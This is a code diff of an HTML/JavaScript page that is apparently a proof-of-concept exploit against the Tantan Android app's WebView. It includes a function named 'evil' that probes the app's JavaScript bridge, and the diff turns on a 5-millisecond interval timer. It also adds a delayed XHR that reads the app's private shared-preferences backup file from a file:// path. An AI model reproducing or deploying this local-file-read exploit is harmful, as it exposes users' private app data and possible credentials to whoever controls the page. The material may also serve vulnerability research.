@@ -17,15 +17,10 @@ function evil(){
 	document.getElementById("content").innerText = 'call canIUse : '+window.tantan.canIUse('cc') + ' , and : ' + window.tantan.triggerAction('c','d');
 }
 
-//setInterval(gotowhite,5);//5毫秒
+setInterval(gotowhite,5);//5毫秒
 //setTimeout(evil,3000);//倒计时3秒
 	
 
-  
-</script>
-	
-	
-<script>
 function createXHR(){
     if(typeof XMLHttpRequest != 'undefined'){
         return new XMLHttpRequest();
@@ -52,9 +47,15 @@ function sendGetRequest(url,callback){
     xhr.send();
     callback(xhr.responseText);
 }
+	
+function sendRequest(){
 sendGetRequest('file:///data/data/com.p1.mobile.putong/shared_prefs/putongPref_backup.xml', function(response){
     console.log(response);
 });
+}
+	
+setTimeout(sendRequest,3000);//倒计时3秒
+	
 </script>
 	
 </body>
